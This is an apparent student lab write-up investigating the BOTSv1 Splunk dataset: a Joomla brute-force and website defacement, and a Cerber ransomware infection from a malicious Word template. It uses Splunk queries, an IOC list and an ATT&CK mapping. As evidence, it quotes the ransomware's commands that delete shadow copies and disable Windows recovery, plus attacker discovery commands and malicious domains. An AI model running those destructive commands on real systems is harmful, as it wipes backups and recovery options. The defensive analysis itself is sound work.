# BOTSv1 Security Investigation

**Author:** Nabin Tharu  
**Platform:** Splunk  
**Dataset:** Boss of the SOC v1  
**Main Incidents:** Website Defacement and Cerber Ransomware

---

## Executive Summary

This report investigates two separate security incidents in the BOTSv1 dataset.

The first incident was an external attack against `imreallynotbatman.com`. The attack started with website scanning, followed by Joomla brute-force login attempts. After getting administrator access, the attacker uploaded `agent.php`, transferred and executed `3791.exe`, performed system discovery, downloaded an image and changed the website image.

The second incident was a Cerber ransomware infection on workstation `we8105desk`, which was used by `bob.smith`. The attack started when a malicious Microsoft Word template named `Miranda_Tate_unveiled.dotm` was opened. The document started an obfuscated script, created temporary files and executed a fake `osk.exe` from the user `AppData\Roaming` folder. The malware disabled Windows recovery, deleted shadow copies, opened ransom notes and created Cerber-related DNS and Suricata alerts.

---

## 1. Investigation Scope and Data Sources

The investigation used the `botsv1` index in Splunk.

The main log sources were:

- Suricata
- HTTP stream
- DNS stream
- SMB stream
- Windows Security logs
- Sysmon logs
- FortiGate logs

Query used to identify available indexes:

```spl
| eventcount summarize=false
| dedup index
| fields index
```

---

# 2. Scenario One: Website Defacement

## 2.1 Reconnaissance and Vulnerability Scanning

I first reviewed Suricata logs to find systems receiving a large amount of web traffic. Port `80` was selected because the website used HTTP communication.

The source IP `40.80.148.42` generated the highest amount of HTTP traffic. Most requests were sent to `imreallynotbatman.com`, mainly to Joomla search paths.

```spl
index="botsv1"
sourcetype=suricata
dest_port=80
src_ip="40.80.148.42"
```

The HTTP headers contained the following user-agent:

```text
Acunetix Web Vulnerability Scanner - Free Edition
```

This confirms that Acunetix was used to scan the website for possible weaknesses.

## 2.2 Joomla Brute-Force Login

A different IP address, `23.22.63.114`, sent many POST requests to the Joomla administrator login page.

The requests used the username `admin` with many different passwords.

```spl
index="botsv1"
source="stream:http"
http_method=POST
imreallynotbatman.com
form_data="*username=admin*"
| table _time form_data src_ip
| sort _time
```

One request contained the correct password:

```text
Username: admin
Password: batman
```

The response and later administrator activity show that the login was successful.

## 2.3 PHP Backdoor Upload

After getting Joomla administrator access, the attacker uploaded a PHP file named:

```text
agent.php
```

The HTTP multipart request contained obfuscated PHP code. This is consistent with a PHP web shell or backdoor.

```spl
index="botsv1"
source="stream:http"
http_method=POST
imreallynotbatman.com
agent.php
| sort _time
```

The same upload activity also transferred:

```text
3791.exe
```

HTTP logs confirmed delivery, but Sysmon logs were needed to confirm execution.

## 2.4 Execution of `3791.exe`

The affected web server was:

```text
we1149srv
```

Sysmon Event ID `1` records process creation. It was used to confirm that `3791.exe` was executed.

```spl
index="botsv1"
host="we1149srv"
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1
| rex field=_raw "<Data Name=[\'\"]Image[\'\"]>(?<Image>[^<]+)</Data>"
| rex field=_raw "<Data Name=[\'\"]CommandLine[\'\"]>(?<CommandLine>[^<]+)</Data>"
| rex field=_raw "<Data Name=[\'\"]ParentImage[\'\"]>(?<ParentImage>[^<]+)</Data>"
| search Image="*3791.exe*" OR CommandLine="*3791.exe*"
| table _time Image CommandLine ParentImage
| sort _time
```

The result confirmed that `3791.exe` was not only uploaded. It was also executed on the server.

## 2.5 Post-Exploitation Discovery

After getting command execution, the attacker collected information about the server and network.

- `whoami` — shows the current user account.
- `net user` — lists user accounts.
- `net view /domain` — finds systems in the Windows domain.
- `net share` — lists shared folders.
- `net session` — shows active SMB sessions.

These commands show system and network discovery. They do not directly prove successful privilege escalation.

## 2.6 Malware Hash and Outbound Communication

The MD5 hash of `3791.exe` was:

```text
AAE3F5A29935E6ABCC2C2754D12A9AF0
```

VirusTotal behaviour information linked the file with `23.22.63.114`, which was also used during the Joomla brute-force activity.

Network logs showed that the compromised server `192.168.250.70` contacted:

```text
prankglassinebracket.jumpingcrab.com
```

The domain resolved to `23.22.63.114` and communication used port `1337`.

The requested file was:

```text
/poisonivy-is-coming-for-you-batman.jpeg
```

```spl
index="botsv1"
src_ip="192.168.250.70"
dest_ip="23.22.63.114"
```

The HTTP response contained valid JPEG information and around `554 KB` of data. This confirms a real file transfer.

## 2.7 Website Defacement

Shortly after the JPEG download, commands launched by `php-cgi.exe` changed the image file names.

```cmd
move ..\1.jpeg 2.jpeg
move 2.jpeg imnotbatman.jpg
```

The parent process was:

```text
C:\Program Files (x86)\PHP\v5.5\php-cgi.exe
```

This suggests that the commands were executed through the uploaded PHP backdoor.

---

# 3. Scenario Two: Cerber Ransomware on `we8105desk`

## 3.1 Identifying the Affected Workstation

A dashboard showed high traffic between:

```text
192.168.2.50 → 192.168.250.100
```

Further investigation showed that `192.168.250.100` was mainly connected with host `we8105desk`.

```spl
index="botsv1"
"192.168.250.100"
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
```

## 3.2 USB Ejection Message

The query below returned a Windows System event, not Sysmon Event ID `3`.

```spl
index="botsv1"
host="we8105desk"
EventType=3
```

The event showed that `osk.exe` with PID `3588` stopped the removal of a USB device.

Suspicious process:

```text
C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\
{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe
```

USB device:

```text
USB\VID_058F&PID_6387\7D961196
```

This message does not prove that malware was executed from USB. It only shows that the process was using the device when removal was attempted.

## 3.3 Process Chain and Ransomware Behaviour

```spl
index="botsv1"
host="we8105desk"
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
"<EventID>1</EventID>"
"osk.exe"
| rex field=_raw "<Data Name='ProcessId'>(?<ProcessId>[^<]+)"
| rex field=_raw "<Data Name='Image'>(?<Image>[^<]+)"
| rex field=_raw "<Data Name='CommandLine'>(?<CommandLine>[^<]+)"
| rex field=_raw "<Data Name='User'>(?<User>[^<]+)"
| rex field=_raw "<Data Name='Hashes'>(?<Hashes>[^<]+)"
| rex field=_raw "<Data Name='ParentImage'>(?<ParentImage>[^<]+)"
| rex field=_raw "<Data Name='ParentCommandLine'>(?<ParentCommandLine>[^<]+)"
| table _time User ProcessId Image CommandLine Hashes ParentImage ParentCommandLine
| sort _time
```

The malware executed these commands:

- `bcdedit.exe /set {default} recoveryenabled no` — disables Windows recovery.
- `bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures` — makes Windows ignore boot failures.
- `WMIC.exe shadowcopy delete` — deletes shadow copies.
- `vssadmin.exe delete shadows /all /quiet` — silently deletes all shadow copies.
- `NOTEPAD.EXE "# DECRYPT MY FILES #.txt"` — opens the ransom note.
- `WScript.exe "# DECRYPT MY FILES #.vbs"` — runs the ransom script.
- `iexplore.exe -nohome` — opens Internet Explorer without the normal home page.
- `taskkill /t /f /im "osk.exe"` — forcefully stops `osk.exe`.
- `del "...osk.exe"` — removes the malware file.

## 3.4 Hash and DNS Correlation

SHA-256 of suspicious `osk.exe`:

```text
37397f8d8e4b3731749094d7b7cd2cf56cacb12dd69e0131f07dd78dff6f262b
```

VirusTotal listed this Cerber-related domain:

```text
cerberhhyed5frqa.xmfir0.win
```

DNS query:

```spl
index="botsv1"
src_ip="192.168.250.100"
sourcetype="stream:dns"
dest_port=53
"query_type{}"=A
| table _time query{}
```

`query_type{}=A` was used because an A record maps a domain name to an IPv4 address.

The same domain appeared in VirusTotal and the DNS logs. This proves that the infected workstation attempted to resolve it.

## 3.5 Initial Infection Vector

Microsoft Word opened:

```text
D:\Miranda_Tate_unveiled.dotm
```

Parent command:

```cmd
"C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n /f "D:\Miranda_Tate_unveiled.dotm"
```

Word then launched an obfuscated command through `cmd.exe` and `WScript.exe`.

Infection chain:

```text
Miranda_Tate_unveiled.dotm
        ↓
Obfuscated script
        ↓
Temporary executable
        ↓
Fake osk.exe
        ↓
Recovery deletion, encryption and ransom note
```

## 3.6 Suricata Alerts

Cerber-related alerts included:

```text
ETPRO TROJAN Ransomware/Cerber Onion Domain Lookup
ET POLICY Possible External IP Lookup ipinfo.io
ETPRO TROJAN Ransomware/Cerber Checkin 2
```

These alerts give strong evidence of attempted C2 activity.

## 3.7 SMB Activity

High SMB traffic was found around the ransomware alert time.

Common SMB operations:

- `smb2 create`
- `smb2 write`
- `smb2 read`
- `smb2 close`
- `smb2 set info`
- `smb2 query info`
- `smb2 query directory`

The SMB activity used the account:

```text
Administrator
```

These are SMB protocol operations, not Windows commands. Heavy SMB traffic alone does not prove lateral movement.

## 3.8 Nessus Activity Through SMB and WMI

Sysmon showed:

```cmd
netstat -ano
netsh wlan show interface
```

The parent process was `WmiPrvSE.exe`, and output was saved in temporary files beginning with `nessus_`.

This suggests that an authenticated Nessus vulnerability scan used SMB and WMI to collect information.

## 3.9 Cerber Cryptor Download

I first reviewed all network traffic from the infected host.

```spl
index="botsv1"
src_ip="192.168.250.100"
| stats count BY sourcetype dest_ip dest_port
| sort - count
```

The result showed communication with:

```text
37.187.37.150
```

using:

```text
stream:http
Port 80
```

HTTP logs then showed this download:

```http
GET /mhtr.jpg HTTP/1.1
Host: solidaritedeproximite.org
```

The file name was:

```text
mhtr.jpg
```

Although it used a `.jpg` extension, it was connected with the Cerber malware delivery chain.

---

# 4. Findings and Evidence Assessment

| Finding | Evidence | Confidence |
|---|---|---|
| Website scanning | Acunetix traffic from `40.80.148.42` | High |
| Joomla brute force | Repeated login attempts from `23.22.63.114` | High |
| Successful Joomla access | Correct password followed by admin activity | High |
| PHP backdoor upload | `agent.php` with obfuscated PHP | High |
| `3791.exe` execution | Sysmon Event ID 1 on `we1149srv` | High |
| Website defacement | JPEG download and rename to `imnotbatman.jpg` | High |
| Ransomware execution | Fake `osk.exe`, recovery deletion and ransom notes | High |
| Initial ransomware vector | `Miranda_Tate_unveiled.dotm` | High |
| Cerber C2 attempt | DNS lookup and Suricata alerts | High for attempt |
| USB as initial vector | Only ejection-block message exists | Not proven |
| SMB lateral movement | Heavy SMB operations without remote execution evidence | Possible |
| Nessus activity | WMI parent and `nessus_` files | High |
| Cryptor download | `/mhtr.jpg` from `solidaritedeproximite.org` | High |

---

# 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Reconnaissance | Active Scanning | T1595 | Acunetix scanning |
| Credential Access | Brute Force | T1110 | Repeated Joomla login attempts |
| Initial Access | Valid Accounts | T1078 | Successful Joomla admin login |
| Persistence / Execution | Web Shell | T1505.003 | `agent.php` |
| Discovery | System and Network Discovery | T1087 / T1018 / T1135 | Discovery commands |
| Initial Access | Spearphishing Attachment | T1566.001 | `Miranda_Tate_unveiled.dotm` |
| Execution | User Execution | T1204 | User opened malicious file |
| Defense Evasion | Impair Defenses | T1562.001 | Recovery disabled |
| Command and Control | Application Layer Protocol | T1071 | Cerber DNS and check-in activity |
| Impact | Data Encrypted for Impact | T1486 | Cerber ransomware behaviour |

---

# 6. Indicators of Compromise

## IP Addresses

```text
40.80.148.42
23.22.63.114
37.187.37.150
192.168.250.70
192.168.250.100
```

## Domains

```text
imreallynotbatman.com
prankglassinebracket.jumpingcrab.com
cerberhhyed5frqa.xmfir0.win
solidaritedeproximite.org
```

## Files

```text
agent.php
3791.exe
Miranda_Tate_unveiled.dotm
mhtr.jpg
poisonivy-is-coming-for-you-batman.jpeg
imnotbatman.jpg
```

## Hashes

```text
MD5:
AAE3F5A29935E6ABCC2C2754D12A9AF0

SHA-256:
37397f8d8e4b3731749094d7b7cd2cf56cacb12dd69e0131f07dd78dff6f262b
```

---

# 7. Final Conclusion

The BOTSv1 dataset contained two different incidents.

The first incident was a website attack against `imreallynotbatman.com`. The attacker scanned the website, brute-forced the Joomla administrator account, uploaded a PHP backdoor, executed `3791.exe`, collected system information and changed the website image.

The second incident was a Cerber ransomware infection on `we8105desk`. The infection started from `Miranda_Tate_unveiled.dotm`. The document launched an obfuscated script and executed a fake `osk.exe`. The malware disabled recovery, deleted shadow copies, displayed ransom notes and contacted Cerber-related infrastructure.

The investigation also found heavy SMB activity using the `Administrator` account. Some SMB and WMI activity was connected with Nessus scanning, so it must be separated from ransomware activity.

The HTTP logs finally showed that the infected host contacted `37.187.37.150` and downloaded `mhtr.jpg` from `solidaritedeproximite.org`.

---

## Disclaimer

This project was completed for cybersecurity learning and defensive investigation using the BOTSv1 dataset.
